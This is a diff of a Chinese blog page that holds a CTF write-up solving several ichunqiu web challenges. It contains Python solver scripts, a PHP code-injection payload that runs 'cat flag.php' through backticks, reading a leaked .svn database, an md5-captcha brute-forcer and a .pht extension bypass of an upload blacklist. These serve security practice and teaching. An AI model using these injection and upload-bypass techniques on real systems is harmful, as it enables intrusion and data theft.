@@ -1,552 +1,557 @@
-
-
 <!DOCTYPE html>
-<html lang="zh-CN" data-default-color-scheme=&#34;dark&#34;>
-
-
-
+<html>
 <head>
-  <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
-  <link rel="icon" type="image/png" href="/img/favicon.png">
-  <meta name="viewport"
-        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
-  <meta http-equiv="x-ua-compatible" content="ie=edge">
-  
-  <meta name="theme-color" content="#2f4154">
-  <meta name="description" content="">
-  <meta name="author" content="osword">
-  <meta name="keywords" content="">
-  <title>实验吧_web[1] - osword&#39;s blog</title>
+    
 
-  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+    
+
+    
 
 
-  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
-  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
 
-  
+    <meta charset="utf-8">
     
     
-      
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/darcula.min.css" />
     
-  
+    
+    <title>实验吧_web[1] | osword&#39;s blog | 小刀</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="CTF">
+    <meta name="description" content="Misc-web1                                                                                                             直接看if判断语句$_SESSION[&#39;whoami&#39;]&#x3D;&#x3D;($value[0].$value[1]) &amp;&amp; substr(md5(">
+<meta property="og:type" content="article">
+<meta property="og:title" content="实验吧_web[1]">
+<meta property="og:url" content="http://zhzhdoai.github.io/2019/05/10/%E5%AE%9E%E9%AA%8C%E5%90%A7-web-1/index.html">
+<meta property="og:site_name" content="osword&#39;s blog">
+<meta property="og:description" content="Misc-web1                                                                                                             直接看if判断语句$_SESSION[&#39;whoami&#39;]&#x3D;&#x3D;($value[0].$value[1]) &amp;&amp; substr(md5(">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://zhzhdoai.github.io/2019/05/10/%E5%AE%9E%E9%AA%8C%E5%90%A7-web-1/1.png">
+<meta property="og:image" content="http://zhzhdoai.github.io/2019/05/10/%E5%AE%9E%E9%AA%8C%E5%90%A7-web-1/2.png">
+<meta property="og:image" content="http://zhzhdoai.github.io/2019/05/10/%E5%AE%9E%E9%AA%8C%E5%90%A7-web-1/3.png">
+<meta property="og:image" content="http://zhzhdoai.github.io/2019/05/10/%E5%AE%9E%E9%AA%8C%E5%90%A7-web-1/4.png">
+<meta property="article:published_time" content="2019-05-10T08:10:16.000Z">
+<meta property="article:modified_time" content="2020-05-15T08:28:02.000Z">
+<meta property="article:author" content="osword">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://zhzhdoai.github.io/2019/05/10/%E5%AE%9E%E9%AA%8C%E5%90%A7-web-1/1.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="osword&#39;s blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
 
-  
+    <!-- custom head -->
+    
 
-
-<!-- 主题依赖的图标库，不要自行修改 -->
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_pf9vaxs7x7b.css">
-
-
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
-
-
-<link  rel="stylesheet" href="/css/main.css" />
-
-<!-- 自定义样式保持在最底部 -->
-
-
-  <script  src="/js/utils.js" ></script>
-  <script  src="/js/color-schema.js" ></script>
 <meta name="generator" content="Hexo 4.2.1"></head>
 
-
 <body>
-  <header style="height: 70vh;">
-    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
-  <div class="container">
-    <a class="navbar-brand"
-       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+    <div id="loading" class="active"></div>
 
-    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
-            data-target="#navbarSupportedContent"
-            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-      <div class="animated-icon"><span></span><span></span><span></span></div>
-    </button>
-
-    <!-- Collapsible content -->
-    <div class="collapse navbar-collapse" id="navbarSupportedContent">
-      <ul class="navbar-nav ml-auto text-center">
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">osword</h5>
+          <a href="mailto:929337105@qq.com" title="929337105@qq.com" class="mail">929337105@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
         
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/">
-                <i class="iconfont icon-home-fill"></i>
-                首页
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
               </a>
             </li>
-          
         
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/archives/">
-                <i class="iconfont icon-archive-fill"></i>
-                归档
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
               </a>
             </li>
-          
         
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/categories/">
-                <i class="iconfont icon-category-fill"></i>
-                分类
+            <li class="waves-block waves-effect">
+              <a href="https://zhzhdoai.github.io/"  >
+                <i class="icon icon-lg icon-友链"></i>
+                友链
               </a>
             </li>
-          
         
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/tags/">
-                <i class="iconfont icon-tags-fill"></i>
-                标签
+            <li class="waves-block waves-effect">
+              <a href="https://glotozz.github.io/" target="_blank" rel="noopener"  >
+                <i class="icon icon-lg icon-glotozz"></i>
+                Glotozz
               </a>
             </li>
-          
         
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/about/">
-                <i class="iconfont icon-user-fill"></i>
-                关于
+            <li class="waves-block waves-effect">
+              <a href="https://nikoeurus.github.io/" target="_blank" rel="noopener"  >
+                <i class="icon icon-lg icon-sommus"></i>
+                Sommus
               </a>
             </li>
-          
         
+            <li class="waves-block waves-effect">
+              <a href="https://mochazz.github.io/" target="_blank" rel="noopener"  >
+                <i class="icon icon-lg icon-mochazz@七月火"></i>
+                Mochazz 七月火
+              </a>
+            </li>
         
-          <li class="nav-item" id="search-btn">
-            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
-                class="iconfont icon-search"></i>&nbsp;</a>
-          </li>
+            <li class="waves-block waves-effect">
+              <a href="https://tea9.xyz/" target="_blank" rel="noopener"  >
+                <i class="icon icon-lg icon-tea9"></i>
+                Tea 9
+              </a>
+            </li>
         
-        
-          <li class="nav-item" id="color-toggle-btn">
-            <a class="nav-link" href="javascript:">&nbsp;<i
-                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
-          </li>
+            <li class="waves-block waves-effect">
+              <a href="https://wulidecade.cn/" target="_blank" rel="noopener"  >
+                <i class="icon icon-lg icon-Decade"></i>
+                Decade
+              </a>
+            </li>
         
       </ul>
     </div>
   </div>
-</nav>
+</aside>
 
-    <div class="banner intro-2" id="background" parallax=true
-         style="background: url('/img/default.png') no-repeat center center;
-           background-size: cover;">
-      <div class="full-bg-img">
-        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
-          <div class="container page-header text-center fade-in-up">
-            <span class="h2" id="subtitle">
-              
-            </span>
-
-            
-              <div class="mt-3">
-  
-  
-    <span class="post-meta">
-      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2019-05-10 16:10" pubdate>
-        2019年5月10日 下午
-      </time>
-    </span>
-  
-</div>
-
-<div class="mt-1">
-  
-    
-    <span class="post-meta mr-2">
-      <i class="iconfont icon-chart"></i>
-      442 字
-    </span>
-  
-
-  
-    
-    <span class="post-meta mr-2">
-      <i class="iconfont icon-clock-fill"></i>
-      
-      
-      7
-       分钟
-    </span>
-  
-
-  
-  
-    
-      <!-- 不蒜子统计文章PV -->
-      <span id="busuanzi_container_page_pv" style="display: none">
-        <i class="iconfont icon-eye" aria-hidden="true"></i>
-        <span id="busuanzi_value_page_pv"></span> 次
-      </span>
-    
-  
-</div>
-
-            
-          </div>
-
-          
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">实验吧_web[1]</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
         </div>
-      </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
     </div>
-  </header>
+</header>
+<header class="content-header post-header">
 
-  <main>
-    
-      
-
-<div class="container-fluid">
-  <div class="row">
-    <div class="d-none d-lg-block col-lg-2"></div>
-    <div class="col-lg-8 nopadding-md">
-      <div class="container nopadding-md" id="board-ctn">
-        <div class="py-5" id="board">
-          <article class="post-content mx-auto" id="post">
-            <!-- SEO header -->
-            <h1 style="display: none">实验吧_web[1]</h1>
+    <div class="container fade-scale">
+        <h1 class="title">实验吧_web[1]</h1>
+        <h5 class="subtitle">
             
-            <div class="markdown-body" id="post-body">
-              <h1 id="Misc-web1"><a href="#Misc-web1" class="headerlink" title="Misc-web1"></a>Misc-web1</h1><p><img src="./1.png" srcset="/img/loading.gif" alt=""></p>
+                <time datetime="2019-05-10T08:10:16.000Z" itemprop="datePublished" class="page-time">
+  2019-05-10
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Misc-web1"><span class="post-toc-number">1.</span> <span class="post-toc-text">Misc-web1</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Misc-web2"><span class="post-toc-number">2.</span> <span class="post-toc-text">Misc-web2</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#MISC-WEB-3"><span class="post-toc-number">3.</span> <span class="post-toc-text">MISC WEB 3</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#web-upload"><span class="post-toc-number">4.</span> <span class="post-toc-text">web-upload</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#脚本爆破验证码"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">脚本爆破验证码</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#总结"><span class="post-toc-number">5.</span> <span class="post-toc-text">总结</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-实验吧-web-1"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">实验吧_web[1]</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2019-05-10 16:10:16" datetime="2019-05-10T08:10:16.000Z"  itemprop="datePublished">2019-05-10</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="Misc-web1"><a href="#Misc-web1" class="headerlink" title="Misc-web1"></a>Misc-web1</h1><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="./1.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+
 <p>直接看if判断语句<br><code>$_SESSION[&#39;whoami&#39;]==($value[0].$value[1]) &amp;&amp; substr(md5($value),5,4)==0</code><br>md5对数组求解报错，传入<code>value[]=ea</code></p>
-<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
-<span class="hljs-keyword">import</span> re
-url=<span class="hljs-string">"http://de835d64b7074b5e927755aeac65a2675c25e2c8e7a34779.changame.ichunqiu.com/"</span>
-params=&#123;
-	<span class="hljs-string">'value[]'</span>:<span class="hljs-string">'ea'</span>
-&#125;
-r=requests.session();
-rep=r.get(url=url,params=params)	
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url=<span class="string">"http://de835d64b7074b5e927755aeac65a2675c25e2c8e7a34779.changame.ichunqiu.com/"</span></span><br><span class="line">params=&#123;</span><br><span class="line">	<span class="string">'value[]'</span>:<span class="string">'ea'</span></span><br><span class="line">&#125;</span><br><span class="line">r=requests.session();</span><br><span class="line">rep=r.get(url=url,params=params)	</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">	numname=rep.text[<span class="number">0</span>]+rep.text[<span class="number">1</span>]</span><br><span class="line">	params=&#123;</span><br><span class="line">		<span class="string">'value[]'</span>:numname</span><br><span class="line">	&#125;</span><br><span class="line">	rep=r.get(url=url,params=params)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">'flag&#123;'</span> <span class="keyword">in</span> rep.text:</span><br><span class="line">		<span class="comment">#print(rep.text)</span></span><br><span class="line">		print(re.findall(<span class="string">r"flag&#123;.*&#125;"</span>,rep.text))</span><br></pre></td></tr></table></figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="./2.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
 
-<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">10</span>):
-	numname=rep.text[<span class="hljs-number">0</span>]+rep.text[<span class="hljs-number">1</span>]
-	params=&#123;
-		<span class="hljs-string">'value[]'</span>:numname
-	&#125;
-	rep=r.get(url=url,params=params)
-	<span class="hljs-keyword">if</span> <span class="hljs-string">'flag&#123;'</span> <span class="hljs-keyword">in</span> rep.text:
-		<span class="hljs-comment">#print(rep.text)</span>
-		print(re.findall(<span class="hljs-string">r"flag&#123;.*&#125;"</span>,rep.text))</code></pre>
-<p><img src="./2.png" srcset="/img/loading.gif" alt=""></p>
-<h1 id="Misc-web2"><a href="#Misc-web2" class="headerlink" title="Misc-web2"></a>Misc-web2</h1><p><code>139a352227524e22b5162381e19ac2f073889c74044b4ba3.changame.ichunqiu.com?hello=highlight_file(&#39;flag.php&#39;)</code><br><img src="./3.png" srcset="/img/loading.gif" alt=""></p>
+
+<h1 id="Misc-web2"><a href="#Misc-web2" class="headerlink" title="Misc-web2"></a>Misc-web2</h1><p><code>139a352227524e22b5162381e19ac2f073889c74044b4ba3.changame.ichunqiu.com?hello=highlight_file(&#39;flag.php&#39;)</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="./3.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p><strong>flag{292328a8-b22f-4e52-b153-33bbebbd7a39}</strong></p>
-<pre><code class="hljs sqf">payload hello=);<span class="hljs-built_in">echo</span> `cat <span class="hljs-built_in">flag</span>.php`;<span class="hljs-comment">//</span>
-添加`会以shell执行</code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload hello&#x3D;);echo &#96;cat flag.php&#96;;&#x2F;&#x2F;</span><br><span class="line">添加&#96;会以shell执行</span><br></pre></td></tr></table></figure>
 
 
-<h1 id="MISC-WEB-3"><a href="#MISC-WEB-3" class="headerlink" title="MISC WEB 3"></a>MISC WEB 3</h1><p><strong><a href="http://1e07c09258664e849bfee000ce5d813458700a97c465403b.changame.ichunqiu.com/?hello=GLOBALS" target="_blank" rel="noopener">http://1e07c09258664e849bfee000ce5d813458700a97c465403b.changame.ichunqiu.com/?hello=GLOBALS</a></strong><br><img src="./4.png" srcset="/img/loading.gif" alt=""><br>正则表明只能以数字字母，且var_dump参数存在执行变量．<br><strong>flag{809183e4-0fa2-451f-88c9-2a4745fbedb4}</strong><br>这些超全局变量是：</p>
-<pre><code class="hljs autoit">$GLOBALS、$_SERVER、$_GET、$_POST、$_FILES、$_COOKIE、$_SESSION、$_REQUEST、$_ENV</code></pre>
+<h1 id="MISC-WEB-3"><a href="#MISC-WEB-3" class="headerlink" title="MISC WEB 3"></a>MISC WEB 3</h1><p><strong><a href="http://1e07c09258664e849bfee000ce5d813458700a97c465403b.changame.ichunqiu.com/?hello=GLOBALS" target="_blank" rel="noopener">http://1e07c09258664e849bfee000ce5d813458700a97c465403b.changame.ichunqiu.com/?hello=GLOBALS</a></strong></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="./4.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>正则表明只能以数字字母，且var_dump参数存在执行变量．<br><strong>flag{809183e4-0fa2-451f-88c9-2a4745fbedb4}</strong><br>这些超全局变量是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$GLOBALS、$_SERVER、$_GET、$_POST、$_FILES、$_COOKIE、$_SESSION、$_REQUEST、$_ENV</span><br></pre></td></tr></table></figure>
 
-<h1 id="web-upload"><a href="#web-upload" class="headerlink" title="web-upload"></a>web-upload</h1><pre><code class="hljs routeros">import requests
-import base64
-<span class="hljs-attribute">r</span>=requests.session()
-<span class="hljs-attribute">url</span>=<span class="hljs-string">'http://b906066f071c4a29a74cbcfbfd5945a3a69a9faddfdf4076.changame.ichunqiu.com/'</span>
-<span class="hljs-attribute">rep1</span>=r.get(url=url)
-<span class="hljs-attribute">decode_flag</span>=base64.b64decode(rep1.headers[<span class="hljs-string">'Flag'</span>])[14:]
-<span class="hljs-attribute">value</span>=base64.b64decode(decode_flag)
-data=&#123;
-	<span class="hljs-string">'ichunqiu'</span>:value
-&#125;
-<span class="hljs-attribute">rep2</span>=r.post(url=url,data=data)
-<span class="hljs-builtin-name">print</span>(rep2.text)</code></pre>
+<h1 id="web-upload"><a href="#web-upload" class="headerlink" title="web-upload"></a>web-upload</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line">r&#x3D;requests.session()</span><br><span class="line">url&#x3D;&#39;http:&#x2F;&#x2F;b906066f071c4a29a74cbcfbfd5945a3a69a9faddfdf4076.changame.ichunqiu.com&#x2F;&#39;</span><br><span class="line">rep1&#x3D;r.get(url&#x3D;url)</span><br><span class="line">decode_flag&#x3D;base64.b64decode(rep1.headers[&#39;Flag&#39;])[14:]</span><br><span class="line">value&#x3D;base64.b64decode(decode_flag)</span><br><span class="line">data&#x3D;&#123;</span><br><span class="line">	&#39;ichunqiu&#39;:value</span><br><span class="line">&#125;</span><br><span class="line">rep2&#x3D;r.post(url&#x3D;url,data&#x3D;data)</span><br><span class="line">print(rep2.text)</span><br></pre></td></tr></table></figure>
 <p>输出-&gt; <strong>Path:3712901a08bb58557943ca31f3487b7d</strong></p>
 <p>网站存在<code>.svn</code>源码泄露<br><strong><a href="http://b906066f071c4a29a74cbcfbfd5945a3a69a9faddfdf4076.changame.ichunqiu.com/3712901a08bb58557943ca31f3487b7d/.svn/wc.db" target="_blank" rel="noopener">http://b906066f071c4a29a74cbcfbfd5945a3a69a9faddfdf4076.changame.ichunqiu.com/3712901a08bb58557943ca31f3487b7d/.svn/wc.db</a></strong></p>
-<pre><code class="hljs swift"><span class="hljs-type">OK!</span>
-<span class="hljs-type">Congratulations!</span>
-<span class="hljs-type">My</span> username <span class="hljs-keyword">is</span> md5(<span class="hljs-type">HEL1OW10rDEvery0n3</span>)
-:)</code></pre>
-<h2 id="脚本爆破验证码"><a href="#脚本爆破验证码" class="headerlink" title="脚本爆破验证码"></a>脚本爆破验证码</h2><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">md5</span><span class="hljs-params">(s)</span>:</span>
-    <span class="hljs-keyword">return</span> hashlib.md5(str(s).encode(<span class="hljs-string">'utf-8'</span>)).hexdigest()
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">(s)</span>:</span>
-    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">99999999</span>):
-        <span class="hljs-keyword">if</span> md5(i)[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>]  == str(s):
-            print(i)
-            exit(<span class="hljs-number">0</span>)
-<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
-main(<span class="hljs-string">"d91ca7"</span>)</code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">OK!</span><br><span class="line">Congratulations!</span><br><span class="line">My username is md5(HEL1OW10rDEvery0n3)</span><br><span class="line">:)</span><br></pre></td></tr></table></figure>
+<h2 id="脚本爆破验证码"><a href="#脚本爆破验证码" class="headerlink" title="脚本爆破验证码"></a>脚本爆破验证码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(str(s).encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">99999999</span>):</span><br><span class="line">        <span class="keyword">if</span> md5(i)[<span class="number">0</span>:<span class="number">6</span>]  == str(s):</span><br><span class="line">            print(i)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">main(<span class="string">"d91ca7"</span>)</span><br></pre></td></tr></table></figure>
 <p>输入帐号密码进行登录</p>
-<pre><code class="hljs avrasm"><span class="hljs-symbol">username:</span><span class="hljs-number">8638</span>d5263ab0d3face193725c23ce095
-<span class="hljs-symbol">password:</span><span class="hljs-number">123456</span>
-<span class="hljs-symbol">capture:</span>xxxx</code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username:8638d5263ab0d3face193725c23ce095</span><br><span class="line">password:123456</span><br><span class="line">capture:xxxx</span><br></pre></td></tr></table></figure>
 <p>执行显示<code>flag</code></p>
-<pre><code class="hljs angelscript">The <span class="hljs-number">7815696</span>ecbf1c96e6894b779456d330e.php:)Welcome <span class="hljs-number">8638</span>d5263ab0d3face193725c23ce095!</code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The 7815696ecbf1c96e6894b779456d330e.php:)Welcome 8638d5263ab0d3face193725c23ce095!</span><br></pre></td></tr></table></figure>
 <p>上传文件显示需要jpg格式，00截断无果也无文件包含。fuzz修改后缀名，猜测使用黑名单过滤，使用pht后缀得到Flag.</p>
 <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>文件上传如果要求jpg上传，可以先尝试00截断．无果的话，可以使用被忽略的后缀排除是否为黑名单．<br>白名单的话，看是否上传Phar，但必须得有lfi包含漏洞．</p>
 
-            </div>
-            <hr>
-            <div>
-              <div class="post-metas mb-3">
-                
-                
-                  <div class="post-meta">
-                    <i class="iconfont icon-tags"></i>
-                    
-                      <a class="hover-with-bg" href="/tags/CTF/">CTF</a>
-                    
-                  </div>
-                
-              </div>
-              
-                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" target="_blank" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
-              
-              
-                <div class="post-prevnext row">
-                  <article class="post-prev col-6">
-                    
-                    
-                      <a href="/2019/05/12/open-basedir%E4%BB%A3%E7%A0%81%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">open_basedir代码绕过总结</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
-                  </article>
-                  <article class="post-next col-6">
-                    
-                    
-                      <a href="/2019/05/09/Thinkphp5-3%E6%96%87%E4%BB%B6%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/">
-                        <span class="hidden-mobile">Thinkphp5至3版本文件缓存漏洞</span>
-                        <span class="visible-mobile">下一篇</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
-                    
-                  </article>
-                </div>
-              
-            </div>
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2020-05-15T08:28:02.000Z" itemprop="dateUpdated">2020-05-15 16:28:02</time>
+</span><br>
+
+
+        
+        玩的开心
+        
+    </div>
+    
+    <footer>
+        <a href="http://zhzhdoai.github.io">
+            <img src="/img/avatar.jpg" alt="osword">
+            osword
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>
+
 
             
-          </article>
-        </div>
-      </div>
-    </div>
+<div class="page-share-wrap">
     
-      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
-        <div id="toc">
-  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
-  <div id="tocbot"></div>
-</div>
 
-      </div>
-    
-  </div>
-</div>
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://zhzhdoai.github.io/2019/05/10/%E5%AE%9E%E9%AA%8C%E5%90%A7-web-1/&title=《实验吧_web[1]》 — osword's blog&pic=http://zhzhdoai.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://zhzhdoai.github.io/2019/05/10/%E5%AE%9E%E9%AA%8C%E5%90%A7-web-1/&title=《实验吧_web[1]》 — osword's blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://zhzhdoai.github.io/2019/05/10/%E5%AE%9E%E9%AA%8C%E5%90%A7-web-1/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《实验吧_web[1]》 — osword's blog&url=http://zhzhdoai.github.io/2019/05/10/%E5%AE%9E%E9%AA%8C%E5%90%A7-web-1/&via=http://zhzhdoai.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
